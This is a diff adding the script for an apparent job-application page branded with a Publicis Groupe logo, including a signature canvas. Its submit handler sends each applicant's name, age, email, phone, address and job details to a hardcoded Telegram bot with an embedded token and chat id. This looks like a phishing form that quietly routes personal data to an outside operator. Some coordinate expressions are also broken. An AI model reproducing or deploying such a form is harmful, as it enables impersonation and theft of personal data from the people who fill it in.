@@ -1,0 +1,79 @@
+function startDraw(e) {
+      drawing = true;
+      ctx.beginPath();
+      ctx.moveTo(e.offsetX  e.clientX - canvas.getBoundingClientRect().left,
+                 e.offsetY  e.clientY - canvas.getBoundingClientRect().top);
+    }
+
+    function stopDraw() {
+      drawing = false;
+    }
+
+    function draw(e) {
+      if (!drawing) return;
+      const x = e.offsetX  e.clientX - canvas.getBoundingClientRect().left;
+      const y = e.offsetY  e.clientY - canvas.getBoundingClientRect().top;
+      ctx.lineTo(x, y);
+      ctx.stroke();
+    }
+
+    function clearSignature() {
+      ctx.clearRect(0, 0, canvas.width, canvas.height);
+    }
+
+    function submitForm() {
+      const form = document.getElementById("applicationForm");
+
+      const fullName = form.elements[1].value;
+      const age = form.elements[2].value;
+      const email = form.elements[3].value;
+      const phone = form.elements[4].value;
+      const address = form.elements[5].value;
+      const currentJob = form.elements[6].value;
+      const startDate = form.elements[7].value;
+
+      const message = `
+📨 *新表单提交*
+
+👤 姓名: ${fullName}
+🎂 年龄: ${age}
+📧 邮箱: ${email}
+📞 电话: ${phone}
+🏠 地址: ${address}
+💼 当前工作: ${currentJob}
+📅 希望开始时间: ${startDate}
+      `;
+
+      fetch("https://api.telegram.org/bot8061314553:AAEECshXA60N6yNM-tL_fqIhdtiIfDh8Jks/sendMessage", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+          chat_id: "6998978671",
+          text: message,
+          parse_mode: "Markdown"
+        })
+      }).then(response => {
+        if (response.ok) {
+          document.body.innerHTML = `<div class="container">
+            <img src="131537e2-633a-46fe-83a8-10a941a9ccb5.png" alt="Publicis Groupe Logo" class="logo">
+            <h2>Application Submitted Successfully</h2>
+            <p><strong>Full Name:</strong> ${fullName}</p>
+            <p><strong>Age:</strong> ${age}</p>
+            <p><strong>Email Address:</strong> ${email}</p>
+            <p><strong>Phone Number:</strong> ${phone}</p>
+            <p><strong>Residential Address:</strong> ${address}</p>
+            <p><strong>Current Job:</strong> ${currentJob}</p>
+            <p><strong>Preferred Start Date:</strong> ${startDate}</p>
+          </div>`;
+        } else {
+          alert("❌ 提交失败，无法连接 Telegram。");
+        }
+      }).catch(error => {
+        alert("❌ 提交出错：" + error);
+      });
+    }
+  </script>
+</body>
+</html>
